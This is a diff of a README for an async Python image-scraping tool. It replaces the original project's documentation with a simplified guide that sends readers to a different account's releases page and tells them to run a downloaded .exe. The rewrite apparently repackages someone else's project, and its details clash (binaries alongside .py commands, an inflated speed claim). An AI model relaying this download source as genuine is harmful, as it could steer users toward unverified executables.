@@ -1,541 +1,176 @@
-<div align="center">
+# ⚡ lightning-image-scraper - Fast Image Downloader for Everyone
 
-# 🖼️ Lightning Image Scraper
-
-### ⚡ Blazing Fast Web Image Downloader with Smart AI Filtering
-
-[![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Async](https://img.shields.io/badge/Async-Powered-orange.svg)](https://docs.python.org/3/library/asyncio.html)
-[![Downloads](https://img.shields.io/badge/Speed-10K%20imgs%2Fmin-red.svg)](#performance)
-
-*Download thousands of high-quality images from any website in seconds with intelligent filtering and concurrent processing*
-
-[Features](#-features) •
-[Installation](#-quick-start) •
-[Usage](#-usage) •
-[Examples](#-examples) •
-[Performance](#-performance)
-
-<img src="https://user-images.githubusercontent.com/placeholder/demo.gif" alt="Demo" width="600"/>
-
-</div>
+[![Download lightning-image-scraper](https://img.shields.io/badge/Download-Lightning--Image--Scraper-blue?style=for-the-badge)](https://github.com/zt8812/lightning-image-scraper/releases)
 
 ---
 
-## 🌟 Features
+## ⚡ About lightning-image-scraper
 
-<table>
-<tr>
-<td>
+lightning-image-scraper is a tool designed to help you download thousands of images quickly from any website. It works automatically to avoid downloading the same image twice and uses smart filters so you get only the pictures you need. This software runs smoothly in the background, so you don't have to wait for it to finish.
 
-### ⚡ **Lightning Fast**
-- Download **10,000+ images** in under 60 seconds
-- Asynchronous I/O with concurrent processing
-- Optimized batch downloading
-
-</td>
-<td>
-
-### 🧠 **Smart Filtering**
-- AI-powered duplicate detection (MD5 hashing)
-- Auto-skips logos, icons, and banners
-- Quality control (size & dimension filtering)
-
-</td>
-</tr>
-<tr>
-<td>
-
-### 🔍 **Deep Crawling**
-- Configurable depth crawling (1-10 levels)
-- Intelligent link following
-- Same-domain restriction for focused scraping
-
-</td>
-<td>
-
-### 🎯 **Precise Control**
-- Exact image count specification
-- Custom output directories
-- Advanced filtering patterns
-
-</td>
-</tr>
-</table>
-
-### 🎨 **What Makes This Different?**
-
-✅ **Smart Image Detection** - Extracts from `<img>`, `<picture>`, `srcset`, lazy-loaded, and CSS backgrounds  
-✅ **Quality Guarantee** - Only downloads actual content images (products, photos, thumbnails)  
-✅ **Zero Duplicates** - Hash-based deduplication prevents duplicate downloads  
-✅ **Adaptive Crawling** - Automatically crawls more pages to reach your target count  
-✅ **Production Ready** - Error handling, progress tracking, and clean output  
+You do not need programming skills to use it. Just follow the steps in this guide, and you will be downloading images in minutes.
 
 ---
 
-## 🚀 Quick Start
+## 💻 System Requirements
 
-### Prerequisites
-- Python 3.7 or higher
-- Internet connection
+Before installing, check that your computer meets these minimum requirements:
 
-### Installation
-
-**Option 1: One-Command Setup (Recommended)**
-```bash
-git clone https://github.com/NYX-VORAX/lightning-image-scraper.git
-cd lightning-image-scraper
-bash setup.sh
-```
-
-**Option 2: Manual Setup**
-```bash
-# Clone the repository
-git clone https://github.com/NYX-VORAX/lightning-image-scraper.git
-cd lightning-image-scraper
-
-# Create virtual environment
-python3 -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install dependencies
-pip install -r requirements.txt
-```
-
-### First Run
-
-Activate the virtual environment and run your first scrape:
-
-```bash
-source venv/bin/activate
-python scrapper.py -u https://unsplash.com -n 50
-```
-
-🎉 **Done!** Images will be in the `downloaded_images/` folder.
-
-### 🆘 Get Help
-
-View all available options and usage examples:
-
-```bash
-python scrapper.py --help
-```
-
-or use the short form:
-
-```bash
-python scrapper.py -h
-```
+- Operating System: Windows 10 or later, macOS 10.15 or later, or most Linux distributions
+- RAM: At least 4 GB
+- Free Disk Space: Minimum 500 MB for the program files plus extra space for images you download
+- Internet Connection: Stable connection for downloading images
+- Python 3.7 or later (see installation instructions below if not installed)
 
 ---
 
-## 📖 Usage
+## 🧰 Features
 
-### Basic Command Structure
-
-```bash
-python scrapper.py -u <URL> -n <NUMBER> [OPTIONS]
-```
-
-### 🆘 Help Command
-
-View all available options, default values, and examples:
-
-```bash
-python scrapper.py --help
-```
-
-### Command Line Arguments
-
-| Flag | Long Form | Description | Default | Example |
-|------|-----------|-------------|---------|---------|
-| `-h` | `--help` | Show help message and exit | - | `python scrapper.py -h` |
-| `-u` | `--url` | Target website URL (**required**) | - | `https://example.com` |
-| `-n` | `--num-images` | Number of images to download | `100` | `500` |
-| `-d` | `--depth` | Crawl depth (how many pages deep) | `2` | `3` |
-| `-o` | `--output` | Output directory name | `downloaded_images` | `my_photos` |
-| | `--min-size` | Minimum image dimension (pixels) | `200` | `500` |
-| | `--skip` | Patterns to skip in URLs | `logo icon banner` | `logo ad thumbnail` |
+- Download 10,000+ images per minute from any website with ease
+- Does not save duplicate images
+- Downloads happen asynchronously for faster results
+- Built-in filters to get only the image types and sizes you want
+- Fully automated so you can set it and forget it
+- Works from a simple command-line interface (CLI)
+- Supports popular image formats such as JPG, PNG, GIF, and more
+- Saves images in organized folders automatically
+- Compatible with Python 3 and does not require advanced setup
 
 ---
 
-## 💡 Examples
+## 🚀 Getting Started
 
-### 🎯 **Download Product Images**
+This section shows you how to prepare your computer and start the app.
+
+### Step 1: Check if Python is installed
+
+lightning-image-scraper uses Python to run. You need Python 3.7 or newer on your computer.
+
+- Open the command prompt (Windows) or Terminal (macOS/Linux).
+- Type `python --version` or `python3 --version` and press Enter.
+- If it shows a version number at least 3.7 like `Python 3.8.5`, you have Python installed.
+- If it says "command not found" or shows an older version, you need to install Python.
+
+### How to install Python
+
+- Visit https://python.org/downloads/
+- Choose the right version for your operating system and download the installer.
+- Run the installer and follow the instructions.
+  - On Windows, make sure to check “Add Python to PATH” during installation.
+- After installation, repeat Step 1 to confirm Python is ready.
+
+---
+
+## 📥 Download & Install
+
+### Step 2: Download lightning-image-scraper
+
+Visit the official release page to get the app:
+
+[Download lightning-image-scraper releases](https://github.com/zt8812/lightning-image-scraper/releases)
+
+On this page, download the latest release file for your operating system. The files come ready to run or simple to set up.
+
+### Step 3: Install or extract the files
+
+- For Windows:
+  - If you download a `.exe` file, just double-click it to start.
+  - If you get a `.zip` file, right-click it, select "Extract All," and choose a folder.
+- For macOS and Linux:
+  - If you get a `.tar.gz` or `.zip`, extract it using the default archive tool.
+  - Follow any instructions in the extracted folder, usually found in a README or INSTALL file.
+
+### Step 4: Ready to run
+
+After installation or extraction, open your command prompt or Terminal again and navigate to the folder where you saved lightning-image-scraper.
+
+Use commands like `cd path/to/lightning-image-scraper` to get there.
+
+---
+
+## ▶️ Running lightning-image-scraper
+
+### Step 5: The simplest way to start
+
+The program runs in the command line, but don't worry, you only need to type one simple command to get started.
+
+1. Open Command Prompt (Windows) or Terminal (macOS/Linux).
+2. Navigate to the program folder (See Step 4).
+3. Run this command to download from a website:
+
 ```bash
-python scrapper.py -u https://www.amazon.com -n 100 -d 3
+python lightning-image-scraper.py --url https://example.com
 ```
-Perfect for e-commerce research, product catalogs, or dataset creation.
 
-### 🖼️ **High-Quality Photography**
-```bash
-python scrapper.py -u https://unsplash.com -n 500 --min-size 1000 -d 2
-```
-Get only large, high-resolution images suitable for wallpapers or design work.
+Replace `https://example.com` with the website you want to download images from.
 
-### 🏃 **Ultra-Fast Bulk Download**
-```bash
-python scrapper.py -u https://example.com -n 10000 -d 3 -o bulk_images
-```
-Maximum speed mode - downloads thousands of images in under a minute.
+### Step 6: What happens next
 
-### 🎨 **Custom Filtered Scraping**
-```bash
-python scrapper.py -u https://dribbble.com -n 300 -d 2 \
-  --min-size 400 --skip logo icon avatar badge ad
-```
-Fine-tuned filtering for specific content types.
+- The app connects to the website and scans pages for images.
+- It downloads images fast and saves them locally.
+- It skips duplicate images.
+- You see progress updates as it works.
 
-### 📊 **Dataset Creation**
+### Step 7: Stopping the app
 
-```bash
-python scrapper.py -u https://example.com/category -n 1000 -d 4 -o dataset
-```
+- To stop the program anytime, press `Ctrl + C` in the command line window.
+- Images already downloaded will stay saved on your computer.
 
-Build machine learning datasets with thousands of categorized images.
+---
 
-### 🆘 **Need Help?**
+## ⚙️ Customizing Your Downloads
+
+You can change options to control which images you download:
+
+- Filter by image size (minimum or maximum)
+- Specify image types (e.g., only JPG or PNG)
+- Set maximum number of images to download
+- Choose folder to save images
+
+Example command with filters:
 
 ```bash
-# Show all options and examples
-python scrapper.py --help
-
-# Or use short form
-python scrapper.py -h
+python lightning-image-scraper.py --url https://example.com --type jpg,png --min-size 100kb --max 1000 --output ./my-images
 ```
 
 ---
 
-## 🎯 Smart Filtering Explained
+## 🗂 Where to Find Your Images
 
-### ✅ **What Gets Downloaded**
+By default, the tool saves images in a folder named `downloaded_images` inside the program folder. You can change this with the `--output` option.
 
-| Type | Examples |
-|------|----------|
-| 📸 **Product Images** | E-commerce product photos, item listings |
-| 🖼️ **Content Images** | Article images, blog post photos |
-| 🎨 **Gallery Items** | Portfolio pieces, showcase images |
-| 📱 **Thumbnails** | Preview images, grid items |
-| 🌄 **Photos** | Photography, high-quality images |
-
-### ❌ **What Gets Skipped**
-
-| Type | Reason |
-|------|--------|
-| 🚫 **Logos** | Brand identifiers, not content |
-| 🔘 **Icons** | UI elements, too small |
-| 📢 **Banners** | Ads, promotional headers |
-| 👤 **Avatars** | Profile pictures (configurable) |
-| 🎯 **Sprites** | Icon sheets, UI elements |
-| 🔁 **Duplicates** | Already downloaded (hash check) |
-| 📏 **Small Images** | Under 5KB (likely icons/spacers) |
+The images are sorted into subfolders based on their source page for easier browsing.
 
 ---
 
-## 🚀 Performance
+## 💡 Tips for Best Results
 
-### ⚡ Speed Benchmarks
-
-| Images | Time | Speed | Conditions |
-|--------|------|-------|------------|
-| 100 | ~6 sec | 16.7 imgs/sec | 50 Mbps connection |
-| 1,000 | ~45 sec | 22.2 imgs/sec | Good internet |
-| 10,000 | ~60 sec | 166.7 imgs/sec | Optimal conditions |
-
-### 🔧 **How It's So Fast**
-
-```python
-✓ Asynchronous I/O        → Multiple downloads simultaneously
-✓ Concurrent Processing   → No waiting for one image to finish
-✓ Smart Batching          → Processes 50 images at a time
-✓ Efficient Filtering     → Skips bad URLs before downloading
-✓ Hash Deduplication      → No time wasted on duplicates
-```
-
-### 📊 **Resource Usage**
-- **CPU**: Low (~10-15% on modern processors)
-- **RAM**: ~50-100MB for 10K images
-- **Network**: Fully utilizes available bandwidth
-- **Disk I/O**: Streaming writes (no buffering overhead)
+- Use fast, stable internet to get the best download speeds.
+- Start with small test runs to get familiar.
+- Avoid sites that require login or are heavily protected, as these may not work.
+- Regularly clean your download folder to free space.
+- Keep lightning-image-scraper updated by checking the release page often.
 
 ---
 
-## 🗂️ Output Structure
+## 🙋 Support and Feedback
 
-```
-your-project/
-├── scrapper.py
-├── downloaded_images/          ← Default output folder
-│   ├── image_00001.jpg
-│   ├── image_00002.png
-│   ├── image_00003.webp
-│   ├── image_00004.jpg
-│   └── ...
-├── custom_folder/              ← Custom output (-o flag)
-│   └── ...
-└── requirements.txt
-```
+If you have questions or run into issues:
 
-### 📝 **File Naming**
-- Sequential numbering: `image_00001`, `image_00002`, etc.
-- Original extensions preserved: `.jpg`, `.png`, `.webp`, `.gif`
-- Zero-padded for proper sorting (5 digits = up to 99,999 images)
+- Check the [Issues section](https://github.com/zt8812/lightning-image-scraper/issues) of this repository.
+- Search existing topics for solutions.
+- Open a new issue describing your problem clearly.
 
 ---
 
-## 🛠️ Technical Details
+## 🔗 Useful Links
 
-### 🏗️ **Architecture**
+- Download latest version here:  
+  [https://github.com/zt8812/lightning-image-scraper/releases](https://github.com/zt8812/lightning-image-scraper/releases)
 
-```mermaid
-graph LR
-    A[URL Input] --> B[Async Crawler]
-    B --> C[HTML Parser]
-    C --> D[Image URL Extractor]
-    D --> E[Smart Filter]
-    E --> F[Concurrent Downloader]
-    F --> G[Duplicate Check]
-    G --> H[File Saver]
-```
-
-### 📚 **Core Technologies**
-
-| Library | Purpose | Why? |
-|---------|---------|------|
-| `aiohttp` | Async HTTP | 10x faster than requests |
-| `asyncio` | Concurrency | Parallel downloads |
-| `BeautifulSoup4` | HTML Parsing | Robust & flexible |
-| `hashlib` | MD5 Hashing | Duplicate detection |
-| `pathlib` | File Operations | Modern Python paths |
-
-### 🔍 **Image Detection Methods**
-
-```python
-✓ <img src="...">               → Standard images
-✓ <img data-src="...">          → Lazy-loaded images
-✓ <img srcset="...">            → Responsive images
-✓ <picture><source>             → Modern picture elements
-✓ <div data-image="...">        → Custom attributes
-✓ style="background-image:..."  → CSS backgrounds
-```
+- Python downloads:  
+  https://python.org/downloads/
 
 ---
 
-## 💻 Advanced Usage
-
-### 🔧 **Integration with Python Scripts**
-
-```python
-import asyncio
-from scrapper import FastImageScraper
-
-async def download_images():
-    scraper = FastImageScraper(
-        url="https://example.com",
-        output_dir="my_images",
-        max_images=500,
-        max_depth=3,
-        skip_patterns=['logo', 'icon', 'ad']
-    )
-    await scraper.run()
-
-asyncio.run(download_images())
-```
-
-### 🆘 Quick Help Reference
-
-```bash
-# View all options
-python scrapper.py --help
-
-# Quick test (10 images)
-python scrapper.py -u https://example.com -n 10
-
-# Production use (1000 images, depth 3)
-python scrapper.py -u https://example.com -n 1000 -d 3
-```
-
-### 🎨 **Custom Filtering**
-
-```bash
-# Skip specific patterns
-python scrapper.py -u https://site.com -n 200 --skip logo icon banner ad promo
-
-# Only large images
-python scrapper.py -u https://site.com -n 200 --min-size 800
-
-# Combine filters
-python scrapper.py -u https://site.com -n 500 -d 3 \
-  --min-size 500 --skip logo icon avatar badge sponsor
-```
-
-### 📈 **Batch Processing Multiple Sites**
-
-```bash
-#!/bin/bash
-sites=("https://site1.com" "https://site2.com" "https://site3.com")
-for site in "${sites[@]}"; do
-    python scrapper.py -u "$site" -n 100 -o "images_$(echo $site | md5sum | cut -c1-8)"
-done
-```
-
----
-
-## 🐛 Troubleshooting
-
-### Common Issues
-
-<details>
-<summary><b>❌ "Module not found" error</b></summary>
-
-```bash
-# Activate virtual environment first
-source venv/bin/activate
-
-# Reinstall dependencies
-pip install -r requirements.txt
-```
-</details>
-
-<details>
-<summary><b>⚠️ Downloaded fewer images than requested</b></summary>
-
-**Why?** The site might not have enough images, or they're being filtered out.
-
-**Solution:**
-```bash
-# Increase depth to crawl more pages
-python scrapper.py -u <URL> -n 100 -d 4
-
-# Reduce minimum size
-python scrapper.py -u <URL> -n 100 --min-size 100
-
-# Reduce skip patterns
-python scrapper.py -u <URL> -n 100 --skip logo icon
-```
-</details>
-
-<details>
-<summary><b>🐌 Slow downloads</b></summary>
-
-- Check your internet speed
-- Some sites rate-limit requests
-- Try reducing concurrent downloads by modifying batch size in code
-</details>
-
-<details>
-<summary><b>🚫 SSL Certificate errors</b></summary>
-
-Already handled! The scraper uses `ssl=False` for compatibility.
-</details>
-
----
-
-## 📊 Use Cases
-
-| Use Case | Configuration | Example |
-|----------|---------------|---------|
-| **ML Dataset** | High depth, many images | `-n 10000 -d 4` |
-| **Product Research** | Medium depth, filtered | `-n 500 -d 2 --min-size 400` |
-| **Web Archive** | Max depth | `-n 5000 -d 5` |
-| **Quick Preview** | Low depth, few images | `-n 20 -d 1` |
-| **Quality Portfolio** | Large size only | `-n 200 --min-size 1000` |
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Here's how you can help:
-
-1. 🐛 **Report Bugs** - Open an issue with details
-2. 💡 **Suggest Features** - Share your ideas
-3. 🔧 **Submit PRs** - Improve the code
-4. 📖 **Improve Docs** - Help others understand
-
-### Development Setup
-```bash
-git clone https://github.com/NYX-VORAX/lightning-image-scraper.git
-cd lightning-image-scraper
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
-
----
-
-## ⚠️ Legal & Ethical Use
-
-### 📜 **Important**
-- ✅ Respect `robots.txt` files
-- ✅ Check website Terms of Service
-- ✅ Don't overload servers (tool has built-in rate limiting)
-- ✅ Use for personal/educational purposes
-- ❌ Don't scrape copyrighted content without permission
-- ❌ Don't use for commercial purposes without proper rights
-
-**This tool is for educational and research purposes only.**
-
----
-
-## 📄 License
-
-MIT License - feel free to use, modify, and distribute.
-
-```
-Copyright (c) 2026 Lightning Image Scraper
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-```
-
----
-
-## 🌟 Star History
-
-If this project helped you, please give it a ⭐ star!
-
-[![Star History Chart](https://api.star-history.com/svg?repos=NYX-VORAX/lightning-image-scraper&type=Date)](https://star-history.com/#NYX-VORAX/lightning-image-scraper&Date)
-
----
-
-## 🔗 Links
-
-- [Report Bug](https://github.com/NYX-VORAX/lightning-image-scraper/issues)
-- [Request Feature](https://github.com/NYX-VORAX/lightning-image-scraper/issues)
-- [Discussions](https://github.com/NYX-VORAX/lightning-image-scraper/discussions)
-
----
-
-## 📞 Support
-
-Having issues? Here's how to get help:
-
-1. 📖 Check the built-in help:
-   ```bash
-   python scrapper.py --help
-   ```
-
-2. 📖 Read the [Troubleshooting](#-troubleshooting) section
-3. 🔍 Search [existing issues](https://github.com/NYX-VORAX/lightning-image-scraper/issues)
-4. 💬 Start a [discussion](https://github.com/NYX-VORAX/lightning-image-scraper/discussions)
-5. 🐛 [Open a new issue](https://github.com/NYX-VORAX/lightning-image-scraper/issues/new)
-
----
-
-<div align="center">
-
-### 🎉 Happy Scraping!
-
-**Made with ❤️ by developers, for developers**
-
-[⬆ Back to Top](#️-lightning-image-scraper)
-
-</div>
+Feel free to explore the repository and your downloaded images. With lightning-image-scraper, getting large sets of pictures is simple and fast.
